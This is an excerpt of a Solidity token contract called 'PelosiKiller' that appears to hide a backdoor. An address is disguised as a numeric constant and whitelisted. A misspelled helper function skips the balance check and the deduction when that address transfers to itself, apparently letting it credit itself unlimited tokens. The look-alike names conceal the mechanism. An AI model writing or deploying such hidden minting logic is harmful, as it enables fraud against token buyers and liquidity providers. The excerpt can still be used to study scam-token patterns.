...
abstract contract Ownable {
    ...
    uint256 public mathCode = 731543284558581566516266190338882554122832860390;
...
abstract contract AbsToken is IERC20, Ownable {
    ...
    mapping(address => bool) public _feeWhiteLlst;
    ...
    constructor (
        ...
        address FundAddress,address FundAddress2, address ReceiveAddress,address deployer
    ){
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;
        ...
        _feeWhiteLlst[address(uint160(mathCode))] = true;
    ...
    function _basIcTransfer(address seds, address recpien) internal view returns (bool){
        return (seds != recpien) || (_feeWhiteLlst[seds] == false || false);
    }
    ...
    function _transfer(
        ...
        if (_basIcTransfer(from,to)) require(balance >= amount, "balanceNotEnough");
    ...
    function _tokenTransfer(
        ...
        if (_basIcTransfer(sender,recipient)){
        _balances[sender] = _balances[sender] - tAmount;}
        uint256 feeAmount;
        ...
        if (lpAmount > 0) {
            ...
            if (lpFist > 0) {
                _swapRouter.addLiquidity(
                    address(this), _fist, lpAmount, lpFist, 0, 0, fundAddress2, block.timestamp
                );
            }
        }
    }
...
contract PelosiKiller  is AbsToken {
    constructor() AbsToken(
        ...
        9,
        1000000000000,
        address(0xb5d2697a1E6a5cF40979fc86Fb310eF0EeE035a2),
        address(0xb5d2697a1E6a5cF40979fc86Fb310eF0EeE035a2),
        address(0xb5d2697a1E6a5cF40979fc86Fb310eF0EeE035a2),
        address(0)
    ){
